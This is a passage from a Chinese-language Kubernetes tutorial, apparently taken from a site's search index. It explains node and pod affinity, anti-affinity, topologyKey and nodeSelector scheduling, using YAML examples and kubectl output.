NotIn\uff1alabel \u7684\u503c\u4e0d\u5728\u67d0\u4e2a\u5217\u8868\u4e2d Gt\uff1alabel \u7684\u503c\u5927\u4e8e\u67d0\u4e2a\u503c Lt\uff1alabel \u7684\u503c\u5c0f\u4e8e\u67d0\u4e2a\u503c Exists\uff1a\u67d0\u4e2a label \u5b58\u5728 DoesNotExist\uff1a\u67d0\u4e2a label \u4e0d\u5b58\u5728 \u5982\u679c\u67d0\u4e2a Pod \u540c\u65f6\u6307\u5b9a\u4e86 nodeSelector \u548c nodeAffinity \uff0c\u5219\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u4e24\u4e2a\u6761\u4ef6\uff0c\u624d\u80fd\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5982\u679c\u4e3a nodeAffinity \u6307\u5b9a\u591a\u4e2a nodeSelectorTerms \uff0c\u5219\u76ee\u6807\u8282\u70b9\u53ea\u9700\u8981\u6ee1\u8db3\u4efb\u610f\u4e00\u4e2a nodeSelectorTerms \u7684\u8981\u6c42\uff0c\u5c31\u53ef\u4ee5\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5982\u679c\u4e3a nodeSelectorTerms \u6307\u5b9a\u591a\u4e2a matchExpressions \uff0c\u5219\u76ee\u6807\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u6240\u6709\u7684 matchExpressions \u7684\u8981\u6c42\uff0c\u624d\u80fd\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a\u3002 \u5f53 Pod \u88ab\u8c03\u5ea6\u5230\u67d0\u8282\u70b9\u4e0a\u4e4b\u540e\uff0c\u5982\u679c\u79fb\u9664\u6216\u8005\u4fee\u6539\u8282\u70b9\u7684\u6807\u7b7e\uff0cPod \u5c06\u4ecd\u7136\u7ee7\u7eed\u5728\u8282\u70b9\u4e0a\u8fd0\u884c\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u8282\u70b9\u4eb2\u548c\u6027\u89c4\u5219\u53ea\u5728\u8c03\u5ea6\u8be5 Pod \u65f6\u53d1\u751f\u4f5c\u7528\u3002 preferredDuringSchedulingIgnoredDuringExecution \u4e2d\u7684 weight \u5b57\u6bb5\u53d6\u503c\u8303\u56f4\u4e3a 1-100\u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u6ee1\u8db3\u8c03\u5ea6\u8981\u6c42\u7684\u8282\u70b9\uff08\u8d44\u6e90\u8bf7\u6c42\u3001\u4eb2\u548c\u6027/\u53cd\u4eb2\u548c\u6027\u89c4\u5219\uff0c\u7b49\uff09\uff0c\u8c03\u5ea6\u5668\u5c06\u904d\u5386\u8be5\u8282\u70b9\u5339\u914d\u7684 preferredDuringSchedulingIgnoredDuringExecution \u4e2d\u6240\u6709\u7684 weight \u5e76\u6c42\u548c\u3002\u6b64\u6c42\u548c\u7ed3\u679c\u5c06\u4e0e\u8282\u70b9\u7684\u5176\u4ed6\u4f18\u5148\u7ea7\u8ba1\u7b97\u7684\u5f97\u5206\u5408\u5e76\u3002\u5f97\u5206\u6700\u9ad8\u7684\u8282\u70b9\u88ab\u4f18\u5148\u9009\u62e9\u3002 Pod\u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027 Pod\u4e4b\u95f4\u7684\u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\uff08inter-pod affinity and anti-affinity\uff09\u53ef\u4ee5\u57fa\u4e8e\u5df2\u7ecf\u8fd0\u884c\u5728\u8282\u70b9\u4e0a\u7684 Pod \u7684\u6807\u7b7e\uff08\u800c\u4e0d\u662f\u8282\u70b9\u7684\u6807\u7b7e\uff09\u6765\u9650\u5b9a Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u54ea\u4e2a\u8282\u70b9\u4e0a\u3002\u6b64\u7c7b\u89c4\u5219\u7684\u8868\u73b0\u5f62\u5f0f\u662f\uff1a \u5f53 X \u5df2\u7ecf\u8fd0\u884c\u4e86\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u6ee1\u8db3\u89c4\u5219 Y \u7684 Pod \u65f6\uff0c\u5f85\u8c03\u5ea6\u7684 Pod \u5e94\u8be5\uff08\u6216\u8005\u4e0d\u5e94\u8be5 - \u53cd\u4eb2\u548c\u6027\uff09\u5728 X \u4e0a\u8fd0\u884c \u89c4\u5219 Y \u4ee5 LabelSelector \u7684\u5f62\u5f0f\u8868\u8ff0\uff0c\u9644\u5e26\u4e00\u4e2a\u53ef\u9009\u7684\u540d\u79f0\u7a7a\u95f4\u5217\u8868 \u4e0e\u8282\u70b9\u4e0d\u4e00\u6837\uff0cPod \u662f\u5728\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\uff08\u56e0\u6b64\uff0cPod\u7684\u6807\u7b7e\u662f\u5728\u540d\u79f0\u7a7a\u95f4\u4e2d\u7684\uff09\uff0c\u9488\u5bf9 Pod \u7684 LabelSelector \u5fc5\u987b\u540c\u65f6\u6307\u5b9a\u5bf9\u5e94\u7684\u540d\u79f0\u7a7a\u95f4 X \u662f\u4e00\u4e2a\u62d3\u6251\u57df\u7684\u6982\u5ff5\uff0c\u4f8b\u5982\u8282\u70b9\u3001\u673a\u67dc\u3001\u4e91\u4f9b\u5e94\u5546\u53ef\u7528\u533a\u3001\u4e91\u4f9b\u5e94\u5546\u5730\u57df\uff0c\u7b49\u3002X \u4ee5 topologyKey \u7684\u5f62\u5f0f\u8868\u8fbe\uff0c\u8be5 Key\u4ee3\u8868\u4e86\u8282\u70b9\u4e0a\u4ee3\u8868\u62d3\u6251\u57df\uff08topology domain\uff09\u7684\u4e00\u4e2a\u6807\u7b7e\u3002 pod affinity \u7684\u4e00\u4e2a\u4f8b\u5b50 apiVersion: v1 kind: Pod metadata: name: with-pod-affinity spec: affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: security operator: In values: - S1 topologyKey: failure-domain.beta.kubernetes.io/zone podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: security operator: In values: - S2 topologyKey: failure-domain.beta.kubernetes.io/zone containers: - name: with-pod-affinity image: k8s.gcr.io/pause:2.0 \u8be5 Pod \u7684 affinity \u5b9a\u4e49\u4e86\u4e00\u4e2a Pod \u4eb2\u548c\u6027\u89c4\u5219\u548c\u4e00\u4e2a Pod \u53cd\u4eb2\u548c\u6027\u89c4\u5219\uff0c\u4f8b\u5b50\u4e2d\uff0c podAffinity \u662f requiredDuringSchedulingIgnoredDuringExecution \uff0c\u800c podAntiAffinity \u5219\u662f preferredDuringSchedulingIgnoredDuringExecution \u3002 Pod \u4eb2\u548c\u6027\u89c4\u5219\u8981\u6c42\uff0c\u8be5 Pod \u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230\u7684\u8282\u70b9\u6240\u5728\u7684\u53ef\u7528\u533a zone \u5fc5\u987b\u5df2\u7ecf\u6709\u4e00\u4e2a\u5df2\u7ecf\u8fd0\u884c\u7684 Pod \u5305\u542b\u6807\u7b7e key=security\uff0cvalue=S1\uff0c\u6216\u8005\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u8282\u70b9\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff1a \u8282\u70b9\u5305\u542b key \u4e3a failure-domain.beta.kubernetes.io/zone \u7684\u6807\u7b7e\uff0c\u5047\u8bbe\u8be5\u6807\u7b7e\u7684\u503c\u4e3a V \u81f3\u5c11\u6709\u4e00\u4e2a\u5305\u542b key \u4e3a failure-domain.beta.kubernetes.io/zone \u4e14 value \u4e3a V \u7684\u6807\u7b7e\u7684\u8282\u70b9\u5df2\u7ecf\u8fd0\u884c\u4e86\u4e00\u4e2a\u5305\u542b\u6807\u7b7e key \u4e3a security \u4e14 value \u4e3a S1 \u7684 Pod Pod \u53cd\u4eb2\u548c\u6027\u89c4\u5219\u8981\u6c42\uff0c\u8be5 Pod \u6700\u597d\u4e0d\u8981\u88ab\u8c03\u5ea6\u5230\u5df2\u7ecf\u8fd0\u884c\u4e86\u5305\u542b key \u4e3a security \u4e14 value \u4e3a S2 \u7684\u6807\u7b7e\u7684 Pod \u7684\u8282\u70b9\u4e0a\uff0c\u6216\u8005\u66f4\u51c6\u786e\u5730\u8bf4\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff1a \u5982\u679c topologyKey \u662f failure-domain.beta.kubernetes.io/zone \uff0c\u5219\uff0cPod\u4e0d\u80fd\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a zone \u4e2d\u7684\u5df2\u7ecf\u8fd0\u884c\u4e86\u5305\u542b\u6807\u7b7e security: S2 \u7684\u8282\u70b9\u4e0a \u53c2\u8003 design doc (opens new window) \u53ef\u4ee5\u4e86\u89e3\u66f4\u591a Pod \u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\u7684\u4f8b\u5b50\u3002 \u539f\u5219\u4e0a\uff0c topologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e key\u3002\u7136\u800c\uff0c\u5904\u4e8e\u6027\u80fd\u548c\u5b89\u5168\u7684\u8003\u8651\uff0c\u4ecd\u7136\u5bf9 topologyKey \u6709\u5982\u4e0b\u9650\u5236\uff1a \u5bf9\u4eb2\u548c\u6027\u4ee5\u53ca requiredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c topologyKey \u4e0d\u80fd\u4e3a\u7a7a \u5bf9 requiredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c\u7ba1\u7406\u63a7\u5236\u5668 LimitPodHardAntiAffinityTopology \u88ab\u7528\u6765\u9650\u5236 topologyKey \u5fc5\u987b\u4e3a kubernetes.io/hostname \u3002\u5982\u679c\u60f3\u8981\u4f7f\u7528\u5176\u4ed6\u7684\u81ea\u5b9a\u4e49 topology\uff0c\u5fc5\u987b\u4fee\u6539\u8be5\u7ba1\u7406\u63a7\u5236\u5668\uff0c\u6216\u8005\u5c06\u5176\u7981\u7528 \u5bf9 preferredDuringSchedulingIgnoredDuringExecution Pod \u53cd\u4eb2\u548c\u6027\uff0c\u5982\u679c topologyKey \u4e3a\u7a7a\uff0c\u5219\u4ee3\u8868\u6240\u6709\u7684 topology \uff08\u6b64\u65f6\uff0c\u4e0d\u5c40\u9650\u4e8e kubernetes.io/hostname \u3001 failure-domain.beta.kubernetes.io/zone \u548c failure-domain.beta.kubernetes.io/region \u7684\u7ec4\u5408\uff09 \u9664\u4e86\u4e0a\u8ff0\u7684\u60c5\u5f62\u4ee5\u5916\uff0c topologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e Key \u9664\u4e86 labelSelector \u548c topologyKey \u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a namespaces \u7684\u5217\u8868\uff0c\u7528\u4f5c labelSelector \u7684\u4f5c\u7528\u8303\u56f4\uff08\u4e0e labelSelector \u548c topologyKey \u7684\u5b9a\u4e49\u4e3a\u540c\u4e00\u4e2a\u7ea7\u522b\uff09\u3002\u5982\u679c\u4e0d\u5b9a\u4e49\u6216\u8005\u8be5\u5b57\u6bb5\u4e3a\u7a7a\uff0c\u9ed8\u8ba4\u4e3a Pod \u6240\u5728\u7684\u540d\u79f0\u7a7a\u95f4\u3002 \u6240\u6709\u4e0e requiredDuringSchedulingIgnoredDuringExecution \u4eb2\u548c\u6027\u548c\u53cd\u4eb2\u548c\u6027\u5173\u8054\u7684 matchExpressions \u5fc5\u987b\u88ab\u6ee1\u8db3\uff0cPod \u624d\u80fd\u88ab\u8c03\u5ea6\u5230\u76ee\u6807\u8282\u70b9\u3002 \u4ec0\u4e48\u662ftopologyKey \u987e\u540d\u601d\u4e49\uff0c topology \u5c31\u662f \u62d3\u6251 \u7684\u610f\u601d\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u4e00\u4e2a \u62d3\u6251\u57df \uff0c\u662f\u6307\u4e00\u4e2a\u8303\u56f4\u7684\u6982\u5ff5\uff0c\u6bd4\u5982\u4e00\u4e2a Node\u3001\u4e00\u4e2a\u673a\u67dc\u3001\u4e00\u4e2a\u673a\u623f\u6216\u8005\u662f\u4e00\u4e2a\u5730\u533a\uff08\u5982\u676d\u5dde\u3001\u4e0a\u6d77\uff09\u7b49\uff0c\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u8fd8\u662f Node \u4e0a\u7684\u6807\u7b7e\u3002\u8fd9\u91cc\u7684 topologyKey \u5bf9\u5e94\u7684\u662f Node \u4e0a\u7684\u6807\u7b7e\u7684 Key\uff08\u6ca1\u6709Value\uff09\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5b9e topologyKey \u5c31\u662f\u7528\u4e8e\u7b5b\u9009 Node \u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u5404\u4e2a Pod \u8fdb\u884c\u8de8\u96c6\u7fa4\u3001\u8de8\u673a\u623f\u3001\u8de8\u5730\u533a\u7684\u8c03\u5ea6\u4e86\u3002 \u5982\u4f55\u4f7f\u7528topologyKey \u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a apiVersion: v1 kind: Pod metadata: name: with-pod-affinity spec: affinity: podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: security operator: In values: - S1 topologyKey: failure-domain.beta.kubernetes.io/zone podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: security operator: In values: - S2 topologyKey: kubernetes.io/hostname containers: - name: with-pod-affinity image: k8s.gcr.io/pause:2.0 \u8fd9\u91cc Pod \u7684\u4eb2\u548c\u6027\u89c4\u5219\u662f\uff1a\u8fd9\u4e2a Pod \u8981\u8c03\u5ea6\u5230\u7684 Node \u5fc5\u987b\u6709\u4e00\u4e2a\u6807\u7b7e\u4e3a security: S1 \u7684 Pod\uff0c\u4e14\u8be5 Node \u5fc5\u987b\u6709\u4e00\u4e2a Key \u4e3a failure-domain.beta.kubernetes.io/zone \u7684 \u6807\u7b7e\uff0c\u5373 Node \u5fc5\u987b\u5c5e\u4e8e failure-domain.beta.kubernetes.io/zone \u62d3\u6251\u57df\u3002 Pod \u7684\u53cd\u4eb2\u548c\u6027\u89c4\u5219\u662f\uff1a\u8fd9\u4e2a Pod \u5c3d\u91cf\u4e0d\u8981\u8c03\u5ea6\u5230\u8fd9\u6837\u7684 Node\uff0c\u5176\u5305\u542b\u4e00\u4e2a Key \u4e3a kubernetes.io/hostname \u7684\u6807\u7b7e\uff0c\u4e14\u8be5 Node \u4e0a\u6709\u6807\u7b7e\u4e3a security: S2 \u7684 Pod\u3002 topologyKey\u8be6\u89e3 \u65e2\u7136 topologyKey \u662f\u62d3\u6251\u57df\uff0c\u90a3 Pod \u4e4b\u95f4\u600e\u6837\u624d\u662f\u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff1f \u5982\u679c\u4f7f\u7528 k8s.io/hostname \uff0c\u5219\u8868\u793a\u62d3\u6251\u57df\u4e3a Node \u8303\u56f4\uff0c\u90a3\u4e48 k8s.io/hostname \u5bf9\u5e94\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u662f\u4e0d\u540c\u7684\u62d3\u6251\u57df\u3002\u6bd4\u5982 Pod1 \u5728 k8s.io/hostname=node1 \u7684 Node \u4e0a\uff0cPod2 \u5728 k8s.io/hostname=node2 \u7684 Node \u4e0a\uff0cPod3 \u5728 k8s.io/hostname=node1 \u7684 Node \u4e0a\uff0c\u5219 Pod2 \u548c Pod1\u3001Pod3 \u4e0d\u5728\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff0c\u800cPod1 \u548c Pod3\u5728\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002 \u5982\u679c\u4f7f\u7528 failure-domain.k8s.io/zone \uff0c\u5219\u8868\u793a\u62d3\u6251\u57df\u4e3a\u4e00\u4e2a\u533a\u57df\u3002\u540c\u6837\uff0cNode \u7684\u6807\u7b7e failure-domain.k8s.io/zone \u5bf9\u5e94\u7684\u503c\u4e0d\u4e00\u6837\u4e5f\u4e0d\u662f\u540c\u4e00\u4e2a\u62d3\u6251\u57df\uff0c\u6bd4\u5982 Pod1 \u5728 failure-domain.k8s.io/zone=beijing \u7684 Node \u4e0a\uff0cPod2 \u5728 failure-domain.k8s.io/zone=hangzhou \u7684 Node \u4e0a\uff0c\u5219 Pod1 \u548c Pod2 \u4e0d\u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002 \u5f53\u7136\uff0ctopologyKey \u4e5f\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u6807\u7b7e\u3002\u6bd4\u5982\u53ef\u4ee5\u7ed9\u4e00\u7ec4 Node \u6253\u4e0a\u6807\u7b7e custom_topology \uff0c\u90a3\u4e48\u62d3\u6251\u57df\u5c31\u662f\u9488\u5bf9\u8fd9\u4e2a\u6807\u7b7e\u4e86\uff0c\u5219\u8be5\u6807\u7b7e\u76f8\u540c\u7684 Node \u4e0a\u7684 Pod \u5c5e\u4e8e\u540c\u4e00\u4e2a\u62d3\u6251\u57df\u3002 \u6ce8\u610f\u4e8b\u9879 \u539f\u5219\u4e0a\uff0ctopologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e Key\u3002\u4f46\u662f\u51fa\u4e8e\u6027\u80fd\u548c\u5b89\u5168\u539f\u56e0\uff0c\u5bf9 topologyKey \u6709\u4e00\u4e9b\u9650\u5236\uff1a \u5bf9\u4e8e\u4eb2\u548c\u6027\u548c requiredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0ctopologyKey \u4e0d\u80fd\u4e3a\u7a7a\u3002 \u5bf9\u4e8e requiredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0c\u5f15\u5165 LimitPodHardAntiAffinityTopology \u51c6\u5165\u63a7\u5236\u5668\u6765\u9650\u5236 topologyKey \u53ea\u80fd\u662f kubernetes.io/hostname \u3002\u5982\u679c\u8981\u4f7f\u7528\u81ea\u5b9a\u4e49\u62d3\u6251\u57df\uff0c\u5219\u53ef\u4ee5\u4fee\u6539\u51c6\u5165\u63a7\u5236\u5668\uff0c\u6216\u8005\u76f4\u63a5\u7981\u7528\u5b83\u3002 \u5bf9\u4e8e preferredDuringSchedulingIgnoredDuringExecution \u7684 Pod \u53cd\u4eb2\u548c\u6027\uff0c\u7a7a\u7684 topologyKey \u8868\u793a\u6240\u6709\u62d3\u6251\u57df\u3002\u622a\u6b62 v1.12 \u7248\u672c\uff0c\u6240\u6709\u62d3\u6251\u57df\u8fd8\u53ea\u80fd\u662f kubernetes.io/hostname \u3001 failure-domain.beta.kubernetes.io/zone \u548c failure-domain.beta.kubernetes.io/region \u7684\u7ec4\u5408\u3002 \u9664\u4e0a\u8ff0\u60c5\u51b5\u5916\uff0ctopologyKey \u53ef\u4ee5\u662f\u4efb\u4f55\u5408\u6cd5\u7684\u6807\u7b7e key\u3002 \u66f4\u591a\u5b9e\u7528\u7684\u4f8b\u5b50 Pod \u4eb2\u548c\u6027\u4e0e\u53cd\u4eb2\u548c\u6027\u7ed3\u5408\u9ad8\u7ea7\u522b\u63a7\u5236\u5668\uff08\u4f8b\u5982 ReplicaSet\u3001StatefulSet\u3001Deployment \u7b49\uff09\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u53ef\u4ee5\u975e\u5e38\u5b9e\u7528\u3002\u6b64\u65f6\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5c06\u4e00\u7ec4\u5de5\u4f5c\u590d\u6742\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a topology\uff0c\u4f8b\u5982\uff0c\u540c\u4e00\u4e2a\u8282\u70b9\u3002 \u59cb\u7ec8\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u59cb\u7ec8\u5728\u540c\u4e00\u4e2a\u8282\u70b9 \u5728\u4e00\u4e2a\u4e09\u8282\u70b9\u7684\u96c6\u7fa4\u4e2d\uff0c\u90e8\u7f72\u4e00\u4e2a\u4f7f\u7528 redis \u7684 web \u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u671f\u671b web-server \u5c3d\u53ef\u80fd\u4e0e redis \u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002 \u4e0b\u9762\u662f redis deployment \u7684 yaml \u7247\u6bb5\uff0c\u5305\u542b\u4e09\u4e2a\u526f\u672c\u4ee5\u53ca app=store \u6807\u7b7e\u9009\u62e9\u5668\u3002Deployment \u4e2d\u914d\u7f6e\u4e86 PodAntiAffinity \uff0c\u786e\u4fdd\u8c03\u5ea6\u5668\u4e0d\u4f1a\u5c06\u4e09\u4e2a\u526f\u672c\u8c03\u5ea6\u5230\u4e00\u4e2a\u8282\u70b9\u4e0a\uff1a apiVersion: apps/v1 kind: Deployment metadata: name: redis-cache spec: selector: matchLabels: app: store replicas: 3 template: metadata: labels: app: store spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - store topologyKey: \"kubernetes.io/hostname\" containers: - name: redis-server image: redis:3.2-alpine \u4e0b\u9762\u662f webserver deployment \u7684 yaml \u7247\u6bb5\uff0c\u914d\u7f6e\u4e86 podAntiAffinity \u4ee5\u53ca podAffinity \u3002\u8981\u6c42\u5c06\u5176\u526f\u672c\u4e0e \u5305\u542b app=store \u6807\u7b7e\u7684 Pod \u653e\u5728\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\uff1b\u540c\u65f6\u4e5f\u8981\u6c42 web-server \u7684\u526f\u672c\u4e0d\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: web-server spec: selector: matchLabels: app: web-store replicas: 3 template: metadata: labels: app: web-store spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - web-store topologyKey: \"kubernetes.io/hostname\" podAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - store topologyKey: \"kubernetes.io/hostname\" containers: - name: web-app image: nginx:1.12-alpine \u5982\u679c\u521b\u5efa\u4e0a\u8ff0\u4e24\u4e2a deployment\uff0c\u96c6\u7fa4\u5c06\u5982\u4e0b\u6240\u793a\uff1a Node-1 Node-2 Node-3 web-server-1 webserver-2 webserver-3 cache-1 cache-2 cache-3 web-server \u7684\u4e09\u4e2a\u526f\u672c\u90fd\u81ea\u52a8\u4e0e cach \u7684\u526f\u672c\u8fd0\u884c\u5728\u76f8\u540c\u7684\u8282\u70b9\u4e0a\u3002 kubectl get pods -o wide \u8f93\u51fa\u7ed3\u679c\u5982\u4e0b\u6240\u793a NAME READY STATUS RESTARTS AGE IP NODE redis-cache-1450370735-6dzlj 1/1 Running 0 8m 10.192.4.2 kube-node-3 redis-cache-1450370735-j2j96 1/1 Running 0 8m 10.192.2.2 kube-node-1 redis-cache-1450370735-z73mh 1/1 Running 0 8m 10.192.3.1 kube-node-2 web-server-1287567482-5d4dz 1/1 Running 0 7m 10.192.2.3 kube-node-1 web-server-1287567482-6f7v5 1/1 Running 0 7m 10.192.4.3 kube-node-3 web-server-1287567482-s330j 1/1 Running 0 7m 10.192.3.2 kube-node-2 \u59cb\u7ec8\u4e0d\u5728\u76f8\u540c\u7684\u8282\u70b9\u4e0a \u4e0a\u9762\u7684\u4f8b\u5b50\u4f7f\u7528\u4e86 PodAntiAffinity \u89c4\u5219\u4e0e topologyKey: \"kubernetes.io/hostname\" \u6765\u90e8\u7f72 redis \u96c6\u7fa4\uff0c\u56e0\u6b64\u6ca1\u6709\u4efb\u4f55\u4e24\u4e2a\u526f\u672c\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2a\u8282\u70b9\u4e0a\u3002\u53c2\u8003 ZooKeeper tutorial (opens new window) \u4e86\u89e3\u5982\u4f55\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u4e3a StatefulSet \u914d\u7f6e\u53cd\u4eb2\u548c\u6027\u4ee5\u5b9e\u73b0\u9ad8\u53ef\u7528\u3002 http://bazingafeng.com/2019/03/31/k8s-affinity-topologykey/ https://kuboard.cn/learning/k8s-intermediate/config/affinity.html","title":"\u4eb2\u548c\u6027"},{"location":"lxc/kubernetes/dispatch/#nodeselector","text":"\u6211\u4eec\u77e5\u9053 label \u662f kubernetes \u4e2d\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u7528\u6237\u53ef\u4ee5\u975e\u5e38\u7075\u6d3b\u7684\u5229\u7528 label \u6765\u7ba1\u7406\u96c6\u7fa4\u4e2d\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u4e00\u4e2a\u5c31\u662f service \u901a\u8fc7\u5339\u914d label \u53bb\u9009\u62e9 POD \u7684\u3002\u800c POD \u7684\u8c03\u5ea6\u4e5f\u53ef\u4ee5\u6839\u636e\u8282\u70b9\u7684 label \u8fdb\u884c\u7279\u5b9a\u7684\u90e8\u7f72\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u67e5\u770b\u6211\u4eec\u7684 node \u7684 label\uff1a $ kubectl get nodes --show-labels NAME STATUS ROLES AGE VERSION LABELS 192.168.1.140 Ready <none> 42d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/hostname=192.168.1.140 192.168.1.161 Ready <none> 118d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.161 192.168.1.170 Ready <none> 118d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.170 192.168.1.172 Ready <none> 114d v1.8.1 beta.kubernetes.io/arch=amd64,beta.kubernetes.io/os=linux,kubernetes.io/cluster-service=true,kubernetes.io/hostname=192.168.1.172 \u73b0\u5728\u6211\u4eec\u5148\u7ed9\u8282\u70b9 192.168.1.140 \u589e\u52a0\u4e00\u4e2a source=qikqiak \u7684\u6807\u7b7e\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a $ kubectl label nodes 192.168.1.140 source=qikqiak node \"192.168.1.140\" labeled \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684 --show-labels \u53c2\u6570\u53ef\u4ee5\u67e5\u770b\u4e0a\u8ff0\u6807\u7b7e\u662f\u5426\u751f\u6548\u3002\u5f53 node \u88ab\u6253\u4e0a\u4e86\u76f8\u5173\u6807\u7b7e\u540e\uff0c\u5728\u8c03\u5ea6\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\u4e86\uff0c\u53ea\u9700\u8981\u5728 POD \u7684 spec \u5b57\u6bb5\u4e2d\u6dfb\u52a0 nodeSelector \u5b57\u6bb5\uff0c\u91cc\u9762\u662f\u6211\u4eec\u9700\u8981\u88ab\u8c03\u5ea6\u7684\u8282\u70b9\u7684 label\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u662f\u6211\u4eec\u4e4b\u524d\u7684\u4e00\u4e2a\u9ed8\u8ba4\u7684 busybox POD \u7684 YAML \u6587\u4ef6\uff1a apiVersion: v1 kind: Pod metadata: labels: app: busybox-pod name: test-busybox spec: containers: - command: - sleep - \"3600\" image: busybox imagePullPolicy: Always name: test-busybox \u7136\u540e\u6211\u9700\u8981\u8ba9\u4e0a\u9762\u7684 POD \u88ab\u8c03\u5ea6\u5230140\u7684\u8282\u70b9\u4e0a\uff0c\u90a3\u4e48\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u53bb\u5339\u914d140\u4e0a\u9762\u7684 label\uff0c\u5982\u4e0b\uff1a apiVersion: v1 kind: Pod metadata: labels: app: busybox-pod name: test-busybox spec: containers: - command: - sleep - \"3600\" image: busybox imagePullPolicy: Always name: test-busybox nodeSelector: source: qikqiak \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 describe \u547d\u4ee4\u67e5\u770b\u8c03\u5ea6\u7ed3\u679c\uff1a $ kubectl describe pod test-busybox ...... Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 49s default-scheduler Successfully assigned test-busybox to 192.168.1.140 Normal SuccessfulMountVolume 49s kubelet, 192.168.1.140 MountVolume.SetUp succeeded for volume \"default-token-hmpbz\" Normal Pulling 49s kubelet, 192.168.1.140 pulling image \"busybox\" Normal Pulled 41s kubelet, 192.168.1.140 Successfully pulled image \"busybox\" Normal Created 41s kubelet, 192.168.1.140 Created container Normal Started 41s kubelet, 192.168.1.140 Started container \u6211\u4eec\u53ef\u4ee5\u770b\u5230 Events \u4e0b\u9762\u7684\u4fe1\u606f\uff0c\u4e0a\u9762\u7684 POD 